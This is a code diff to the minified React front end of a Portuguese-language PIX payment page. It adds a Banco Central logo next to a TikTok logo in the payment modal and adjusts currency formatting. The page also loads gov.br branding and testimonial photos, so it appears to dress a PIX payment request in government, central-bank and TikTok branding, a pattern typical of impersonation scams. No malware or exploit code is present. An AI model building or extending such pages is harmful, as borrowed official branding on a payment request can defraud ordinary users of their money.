@@ -8,6 +8,7 @@ import {L as X} from "./lock-COKEO8SK.js";
 
 const O = "/assets/govbr-logo-DUdxlXZj.png",
       J = "/assets/tiktok-logo-CtJns-A9.png",
+      BC = "/assets/banco-central-logo.png", // 🔧 Adicionado caminho da logo do Banco Central
       K = "/assets/testimonial-lucas-DVva3n8g.jpeg",
       Q = "/assets/testimonial-rafael-CZLwIeTm.jpeg",
       U = "/assets/testimonial-amanda-DWOXdEcF.jpeg",
@@ -91,8 +92,8 @@ const xe = () => {
         if (o?.amount) { setPixAmount(o.amount); }
     }, [o]);
 
-    // 🔧 Formatador de moeda
-    const n = t => `R$ ${t.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`;
+    // 🔧 Correção: Inserção de espaço não-quebrável entre o símbolo e o número
+    const n = t => `R$${'\u00A0'}${t.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}`;
     const q = new Date().toLocaleDateString("pt-BR");
     const D = { cpf: "CPF", email: "E-mail", phone: "Celular", random: "Chave aleatória" };
 
@@ -324,45 +325,58 @@ const xe = () => {
         }), o && e.jsxs("div", {
             ref: S,
             className: "mx-4 mb-4 bg-white rounded-[16px] p-5 transition-all duration-500 ease-out",
-            children: [e.jsx("div", {
-                className: "flex justify-center mb-3",
-                children: e.jsx("img", {
-                    src: J, alt: "TikTok", loading: "lazy", width: 28, height: 28, className: "h-[28px] object-contain"
+            children: [
+                // 🔧 AQUI ESTÁ A ALTERAÇÃO DAS LOGOS NO MODAL DO PIX
+                e.jsxs("div", {
+                    className: "flex items-center justify-center gap-3 mb-3",
+                    children: [
+                        e.jsx("img", {
+                            src: J, alt: "TikTok", loading: "lazy", width: 28, height: 28, className: "h-[28px] object-contain"
+                        }),
+                        e.jsx("span", {
+                            className: "text-[#D1D5DB] text-[20px] font-light",
+                            children: "|"
+                        }),
+                        e.jsx("img", {
+                            src: BC, alt: "Banco Central", loading: "lazy", height: 28, className: "h-[28px] object-contain"
+                        })
+                    ]
+                }), 
+                e.jsx("p", {
+                    className: "text-muted-foreground text-[12px] uppercase tracking-wide font-bold mb-4 text-center",
+                    children: "Pague com PIX"
+                }), o.qr_code_base64 ? e.jsx("div", {
+                    className: "flex justify-center mb-4",
+                    children: e.jsx("img", {
+                        src: o.qr_code_base64, alt: "QR Code PIX", className: "w-[200px] h-[200px] rounded-[12px]"
+                    })
+                }) : o.qr_code ? e.jsx("div", {
+                    className: "flex justify-center mb-4",
+                    children: e.jsx("img", {
+                        src: `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(o.qr_code)}`, alt: "QR Code PIX", className: "w-[200px] h-[200px] rounded-[12px]"
+                    })
+                }) : null, e.jsx("p", {
+                    className: "text-muted-foreground text-[12px] text-center mb-3",
+                    children: "Ou copie o código PIX abaixo:"
+                }), o?.amount && e.jsx("div", {
+                    className: "text-center font-extrabold text-[18px] text-pink mb-3 whitespace-nowrap",
+                    children: "Valor: R$ " + (o.amount / 100).toFixed(2).replace(".", ",")
+                }), e.jsx("div", {
+                    className: "relative",
+                    children: e.jsx("div", {
+                        className: "w-full bg-[#F5F5F5] rounded-[10px] p-3 text-[12px] text-foreground break-all leading-relaxed max-h-[80px] overflow-y-auto",
+                        children: o.qr_code
+                    })
+                }), e.jsxs("button", {
+                    onClick: L,
+                    className: "w-full h-[48px] bg-pink text-white font-bold text-[15px] rounded-[12px] mt-3 flex items-center justify-center gap-2 active:scale-[0.98] transition-all",
+                    children: [v ? e.jsx(Y, { size: 18 }) : e.jsx(I, { size: 18 }), v ? "Código copiado!" : "Copiar código PIX"]
+                }), y && e.jsxs("p", {
+                    className: "text-pink text-[13px] text-center mt-3 font-bold",
+                    style: { fontVariantNumeric: "tabular-nums" },
+                    children: ["Expira em: ", y]
                 })
-            }), e.jsx("p", {
-                className: "text-muted-foreground text-[12px] uppercase tracking-wide font-bold mb-4 text-center",
-                children: "Pague com PIX"
-            }), o.qr_code_base64 ? e.jsx("div", {
-                className: "flex justify-center mb-4",
-                children: e.jsx("img", {
-                    src: o.qr_code_base64, alt: "QR Code PIX", className: "w-[200px] h-[200px] rounded-[12px]"
-                })
-            }) : o.qr_code ? e.jsx("div", {
-                className: "flex justify-center mb-4",
-                children: e.jsx("img", {
-                    src: `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(o.qr_code)}`, alt: "QR Code PIX", className: "w-[200px] h-[200px] rounded-[12px]"
-                })
-            }) : null, e.jsx("p", {
-                className: "text-muted-foreground text-[12px] text-center mb-3",
-                children: "Ou copie o código PIX abaixo:"
-            }), o?.amount && e.jsx("div", {
-                className: "text-center font-extrabold text-[18px] text-pink mb-3 whitespace-nowrap",
-                children: "Valor: R$ " + (o.amount / 100).toFixed(2).replace(".", ",")
-            }), e.jsx("div", {
-                className: "relative",
-                children: e.jsx("div", {
-                    className: "w-full bg-[#F5F5F5] rounded-[10px] p-3 text-[12px] text-foreground break-all leading-relaxed max-h-[80px] overflow-y-auto",
-                    children: o.qr_code
-                })
-            }), e.jsxs("button", {
-                onClick: L,
-                className: "w-full h-[48px] bg-pink text-white font-bold text-[15px] rounded-[12px] mt-3 flex items-center justify-center gap-2 active:scale-[0.98] transition-all",
-                children: [v ? e.jsx(Y, { size: 18 }) : e.jsx(I, { size: 18 }), v ? "Código copiado!" : "Copiar código PIX"]
-            }), y && e.jsxs("p", {
-                className: "text-pink text-[13px] text-center mt-3 font-bold",
-                style: { fontVariantNumeric: "tabular-nums" },
-                children: ["Expira em: ", y]
-            })]
+            ]
         }), !o && e.jsxs("div", {
             className: "mx-4 bg-white rounded-[16px] p-4 transition-all duration-500 ease-out space-y-3",
             style: { opacity: s ? 1 : 0, transform: s ? "translateY(0)" : "translateY(16px)", transitionDelay: "400ms" },
